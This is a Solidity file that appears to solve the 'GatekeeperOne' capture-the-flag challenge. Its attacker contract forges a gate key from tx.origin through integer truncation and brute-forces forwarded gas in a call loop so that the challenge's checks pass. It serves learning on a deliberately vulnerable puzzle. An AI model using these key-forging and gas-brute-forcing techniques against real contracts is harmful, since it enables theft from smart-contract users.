// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {

    GatekeeperOne challenge = GatekeeperOne(0xF1eD752dF2889567cc75E49155E1347249A5F0e1);

    function show() public view returns (
        uint32, uint16, uint64, uint64
    ) {
        bytes8 _gateKey = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
        return (
            uint32(uint64(_gateKey)),
            uint16(uint64(_gateKey)),
            uint64(_gateKey),
            uint16(tx.origin)
        );
    }

    function attack(address target) public returns (bool) {
        bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
        
        // NOTE: the proper gas offset to use will vary depending on the compiler
        // version and optimization settings used to deploy the factory contract.
        // To migitage, brute-force a range of possible values of gas to forward.
        // Using call (vs. an abstract interface) prevents reverts from propagating.
        bytes memory encodedParams = abi
            .encodeWithSignature(("enter(bytes8)"), key );

        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 120; i++) {
            (bool result, ) = address(target).call{gas: i + 150 + 8191 * 3}(encodedParams);
            if(result) {
                return result;
            }
        }
        return false;
    }

    function attack(bytes8 gateKey, uint256 gasToUse) external payable {
        challenge.enter{gas: gasToUse}(gateKey);
    }
}